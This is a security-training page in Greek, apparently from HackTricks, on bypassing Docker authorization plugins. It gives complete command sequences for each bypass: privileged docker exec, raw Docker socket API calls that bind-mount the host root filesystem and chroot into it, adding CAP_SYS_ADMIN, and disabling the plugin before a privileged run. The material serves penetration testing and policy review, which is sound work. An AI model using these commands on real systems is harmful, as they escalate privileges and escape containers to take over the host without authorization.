# Runtime Authorization Plugins

{{#include ../../../banners/hacktricks-training.md}}

## Επισκόπηση

Τα runtime authorization plugins αποτελούν ένα επιπλέον επίπεδο policy που αποφασίζει αν ένας caller μπορεί να εκτελέσει μια δεδομένη ενέργεια του daemon. Το Docker είναι το κλασικό παράδειγμα. Από προεπιλογή, οποιοσδήποτε μπορεί να επικοινωνήσει με το Docker daemon έχει ουσιαστικά ευρύ έλεγχο πάνω του. Τα authorization plugins προσπαθούν να περιορίσουν αυτό το μοντέλο εξετάζοντας τον authenticated user και την αιτούμενη API operation και, στη συνέχεια, επιτρέποντας ή απορρίπτοντας το request σύμφωνα με την policy.

Αυτό το θέμα αξίζει τη δική του σελίδα, επειδή αλλάζει το exploitation model όταν ένας attacker έχει ήδη πρόσβαση σε Docker API ή σε user που ανήκει στο `docker` group. Σε τέτοια περιβάλλοντα, το ερώτημα δεν είναι πλέον μόνο "μπορώ να φτάσω στο daemon;", αλλά και "προστατεύεται το daemon από authorization layer και, αν ναι, μπορεί αυτό το layer να παρακαμφθεί μέσω endpoints που δεν έχουν γίνει handled, αδύναμου JSON parsing ή permissions για plugin management;"

## Λειτουργία

Όταν ένα request φτάσει στο Docker daemon, το authorization subsystem μπορεί να προωθήσει το request context σε ένα ή περισσότερα installed plugins. Το plugin βλέπει την authenticated user identity, τα request details, επιλεγμένα headers και τμήματα του request ή response body, όταν το content type είναι κατάλληλο. Πολλαπλά plugins μπορούν να συνδεθούν σε chain και η πρόσβαση επιτρέπεται μόνο αν όλα τα plugins επιτρέψουν το request.

Αυτό το μοντέλο ακούγεται ισχυρό, όμως η ασφάλειά του εξαρτάται πλήρως από το πόσο ολοκληρωμένα έχει κατανοήσει ο policy author το API. Ένα plugin που μπλοκάρει το `docker run --privileged` αλλά αγνοεί το `docker exec`, παραλείπει εναλλακτικά JSON keys όπως το top-level `Binds` ή επιτρέπει plugin administration, μπορεί να δημιουργήσει μια ψευδή αίσθηση περιορισμού, ενώ εξακολουθεί να αφήνει ανοιχτά direct privilege-escalation paths.

## Συνήθεις Plugin Targets

Σημαντικές περιοχές για policy review είναι:

- container creation endpoints
- πεδία του `HostConfig`, όπως τα `Binds`, `Mounts`, `Privileged`, `CapAdd`, `PidMode` και οι επιλογές namespace-sharing
- η συμπεριφορά του `docker exec`
- plugin management endpoints
- οποιοδήποτε endpoint μπορεί έμμεσα να ενεργοποιήσει runtime actions εκτός του intended policy model

Ιστορικά, παραδείγματα όπως το `authz` plugin του Twistlock και απλά εκπαιδευτικά plugins όπως το `authobot` έκαναν αυτό το μοντέλο εύκολο στη μελέτη, επειδή τα policy files και τα code paths τους έδειχναν πώς υλοποιούνταν στην πράξη το endpoint-to-action mapping. Για assessment work, το σημαντικό μάθημα είναι ότι ο policy author πρέπει να κατανοεί ολόκληρο το API surface και όχι μόνο τις πιο εμφανείς CLI commands.

## Abuse

Ο πρώτος στόχος είναι να μάθουμε τι ακριβώς μπλοκάρεται. Αν το daemon απορρίψει μια ενέργεια, το error συχνά κάνει leak το όνομα του plugin, γεγονός που βοηθά στην αναγνώριση του control που χρησιμοποιείται:
```bash
docker ps
docker run --rm -it --privileged ubuntu:24.04 bash
docker plugin ls
```
Εάν χρειάζεστε ευρύτερο endpoint profiling, εργαλεία όπως το `docker_auth_profiler` είναι χρήσιμα, επειδή αυτοματοποιούν τη διαφορετικά επαναλαμβανόμενη διαδικασία ελέγχου των API routes και των JSON structures που επιτρέπονται πραγματικά από το plugin.

Εάν το περιβάλλον χρησιμοποιεί custom plugin και μπορείτε να αλληλεπιδράσετε με το API, απαριθμήστε ποια object fields φιλτράρονται πραγματικά:
```bash
docker version
docker inspect <container> 2>/dev/null | head
curl --unix-socket /var/run/docker.sock http:/version
curl --unix-socket /var/run/docker.sock http:/v1.41/containers/json
```
Αυτοί οι έλεγχοι έχουν σημασία επειδή πολλές αποτυχίες authorization αφορούν συγκεκριμένα πεδία και όχι συγκεκριμένες έννοιες. Ένα plugin μπορεί να απορρίπτει ένα μοτίβο CLI χωρίς να αποκλείει πλήρως την αντίστοιχη δομή API.

### Πλήρες παράδειγμα: Το `docker exec` προσθέτει privilege μετά τη δημιουργία του container

Μια policy που αποκλείει τη δημιουργία privileged container αλλά επιτρέπει τη δημιουργία unconfined container μαζί με `docker exec` μπορεί και πάλι να παρακαμφθεί:
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity
docker ps
docker exec -it --privileged <container_id> bash
```
Εάν ο daemon αποδεχτεί το δεύτερο βήμα, ο χρήστης έχει ανακτήσει μια privileged interactive διεργασία μέσα σε ένα container, το οποίο ο συγγραφέας της policy πίστευε ότι ήταν περιορισμένο.

### Πλήρες Παράδειγμα: Bind Mount μέσω Raw API

Ορισμένες ελαττωματικές policies ελέγχουν μόνο μία JSON μορφή. Εάν το bind mount του root filesystem δεν αποκλειστεί με συνέπεια, το host μπορεί ακόμη να γίνει mount:
```bash
docker version
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> chroot /host /bin/bash
```
Η ίδια ιδέα μπορεί επίσης να εμφανίζεται στο `HostConfig`:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
http:/v1.41/containers/create
```
Ο αντίκτυπος είναι ένα πλήρες escape στο filesystem του host. Η ενδιαφέρουσα λεπτομέρεια είναι ότι το bypass προκύπτει από ελλιπή κάλυψη της policy και όχι από bug στον kernel.

### Πλήρες Παράδειγμα: Μη Ελεγμένο Attribute του Capability

Αν η policy ξεχάσει να φιλτράρει ένα attribute που σχετίζεται με capability, ο attacker μπορεί να δημιουργήσει ένα container που ανακτά ένα επικίνδυνο capability:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> bash
capsh --print
```
Μόλις υπάρχει το `CAP_SYS_ADMIN` ή μια παρόμοια ισχυρή capability, πολλές breakout techniques που περιγράφονται στο [capabilities.md](protections/capabilities.md) και στο [privileged-containers.md](privileged-containers.md) γίνονται προσβάσιμες.

### Πλήρες Παράδειγμα: Απενεργοποίηση του Plugin

Αν επιτρέπονται οι λειτουργίες διαχείρισης του plugin, το καθαρότερο bypass μπορεί να είναι η πλήρης απενεργοποίηση του ελέγχου:
```bash
docker plugin ls
docker plugin disable <plugin_name>
docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bash
docker plugin enable <plugin_name>
```
Αυτή είναι μια αποτυχία policy σε επίπεδο control-plane. Το authorization layer υπάρχει, αλλά ο χρήστης τον οποίο υποτίθεται ότι θα περιόριζε εξακολουθεί να έχει permission να το απενεργοποιήσει.

## Έλεγχοι

Αυτές οι εντολές έχουν ως στόχο να προσδιορίσουν αν υπάρχει policy layer και αν φαίνεται να είναι πλήρες ή επιφανειακό.
```bash
docker plugin ls
docker info 2>/dev/null | grep -i authorization
docker run --rm -it --privileged ubuntu:24.04 bash
curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
```
Τι είναι ενδιαφέρον εδώ:

- Μηνύματα απόρριψης που περιλαμβάνουν το όνομα ενός plugin επιβεβαιώνουν την ύπαρξη ενός authorization layer και συχνά αποκαλύπτουν την ακριβή υλοποίηση.
- Μια λίστα plugin που είναι ορατή στον attacker μπορεί να αρκεί για να διαπιστωθεί αν είναι δυνατές οι λειτουργίες disable ή reconfigure.
- Μια policy που αποκλείει μόνο τις προφανείς ενέργειες CLI, αλλά όχι τα raw API requests, πρέπει να θεωρείται bypassable μέχρι να αποδειχθεί το αντίθετο.

## Προεπιλογές Runtime

| Runtime / platform | Προεπιλεγμένη κατάσταση | Προεπιλεγμένη συμπεριφορά | Συνήθης χειροκίνητη αποδυνάμωση |
| --- | --- | --- | --- |
| Docker Engine | Δεν είναι ενεργοποιημένο από προεπιλογή | Η πρόσβαση στον daemon είναι ουσιαστικά all-or-nothing, εκτός αν έχει ρυθμιστεί authorization plugin | incomplete plugin policy, blacklists αντί για allowlists, allowing plugin management, field-level blind spots |
| Podman | Δεν υπάρχει συνήθης άμεσος αντίστοιχος μηχανισμός | Το Podman συνήθως βασίζεται περισσότερο σε Unix permissions, rootless execution και αποφάσεις σχετικά με την έκθεση του API παρά σε Docker-style authz plugins | exposing a rootful Podman API broadly, weak socket permissions |
| containerd / CRI-O | Διαφορετικό control model | Αυτά τα runtimes συνήθως βασίζονται σε socket permissions, node trust boundaries και controls του orchestrator σε υψηλότερο επίπεδο, αντί για Docker authz plugins | mounting the socket into workloads, weak node-local trust assumptions |
| Kubernetes | Χρησιμοποιεί authn/authz στα επίπεδα του API-server και του kubelet, όχι Docker authz plugins | Το Cluster RBAC και τα admission controls αποτελούν το κύριο policy layer | overbroad RBAC, weak admission policy, exposing kubelet or runtime APIs directly |

{{#include ../../../banners/hacktricks-training.md}}
